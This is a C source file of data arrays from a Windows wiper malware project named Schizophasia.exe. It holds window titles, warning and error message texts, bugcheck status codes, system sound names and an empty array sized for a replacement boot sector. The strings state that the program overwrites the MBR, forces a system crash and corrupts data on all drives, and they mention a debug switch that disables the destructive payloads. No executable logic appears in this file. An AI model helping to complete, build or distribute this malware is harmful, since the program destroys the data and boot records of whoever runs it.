#include "arrays.h"


LPCWSTR g_alpszTitles[15] = {
	TEXT("Schizophasia\0"),
	TEXT("MMRESULT is something other than MMSYSERR_NOERROR - Schizophasia.exe\0"),
	TEXT("Handle of the window is NULL for some reason - Schizophasia.exe\0"),
	TEXT("Something unknown could've happened but that's not the case - Schizophasia.exe\0"),
	TEXT("Can't get SE_SHUTDOWN_PRIVILEGE - Schizophasia.exe\0"),
	TEXT("Running in debug mode - Schizophasia.exe\0"),
	TEXT("To prevent accidental execution - Schizophasia.exe\0"),
	TEXT("WARNING, THIS --WILL-- CAUSE DATA LOSS - Schizophasia.exe\0"),
	TEXT("WriteFile returned an error - Schizophasia.exe\0"),
	TEXT("GetModuleHandleA returned NULL - Schizophasia.exe\0"),
	TEXT("you ran it under wine lol.. - Schizophasia.exe\0"),
	TEXT("SetPriorityClass returned FALSE. - Schizophasia.exe \0"),
	TEXT("HeapFree returned FALSE - Schizophasia.exe\0"),
	TEXT("eeehhh easy modo?\0"),
	TEXT("Unable to get admin rights - Schizophasia.exe\0")
};

LPCWSTR g_alpszMessageBoxTexts[13] = {
	TEXT("The layered window couldn't be created, that's not fun tbh.\
	We won't continue until you fix that for me.... :(((\0"),

	TEXT("The MBR couldn't be overwritten.\0"),

	TEXT("Couldn't get the shutdown privilege(se_shutdown_privilege) in order to cause a bugcheck.\0"),
	
	TEXT("The end?\0"),
	
	TEXT("The executable you`ve just ran is classified as a wiper(type of malware which corrupts/deletes files on the machine).\
	\nIf you were convinced to run this by someone, then you should immediately stop the execution by pressing ''No'' (if this was your friend, they are a bad person and you shouldn't trust them lmfao).\
	\n\nMake sure that this program is running in an isolated enviroment such as a hypervisor or a burner machine.\
	\n\nAll of your data will be corrupted and notcha3 takes no responsibility for the damage caused by this malware.\0"),
	
	TEXT("Audio buffer couldn't be played. You are probably running out of memory.\0"),


	TEXT("This is the last warning before destructive payloads start!\
	\nPlease be sure that you are running it in a safe enviroment.\
	\nDetach all important media such as flash drives/internal storage drives.\
	\nInformation stored on all drives will be corrupted as soon as you press ''Yes''.\
	\n\nPROCEED WITH CAUTION. IF YOU ARE UNSURE WHETHER IT'S SAFE TO START IN THE CURRENT ENVIROMENT, PRESS ''No'' AND NO DAMAGE WILL BE DONE!\0"),

	TEXT("Somehow ntdll.dll is missing from the system, how is it still working lmao.\0"),

	TEXT("Can't free the memory, enjoy memory leak...\0"),

	TEXT("If you're running it using wine, just put the -debug argument and the destructive payloads would be disabled.\0"),

	TEXT("Couldn't get the real time priority.\
	\nIt might be a bit slow..\0"),
	
	TEXT("Schizophasia.exe was ran in the debug mode.\
	\nThe destructive payloads will be disabled. Press ''Yes'' to continue\0"),

	TEXT("Something went wrong :(\0")
};                                                                                                                                            
                                                                                                                                            
CONST NTSTATUS g_alBugcheckStatus[4] = {
	 STATUS_ARRAY_BOUNDS_EXCEEDED,
	 MANUALLY_INITIATED_CRASH1,
	 STATUS_PORT_UNREACHABLE,
	 STATUS_LICENSE_VIOLATION
};

LPCWSTR g_alpszSystemSounds[4] = {
	TEXT("SystemAsterisk\0"),
	TEXT("SystemExclamation\0"),
	TEXT("SystemQuestion\0"),
	TEXT("SystemStart\0")
};                                                                                                                                                                                                                                                       

CONST DWORD g_adwBootSector[512] = {

};                                                                                                                                         
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            

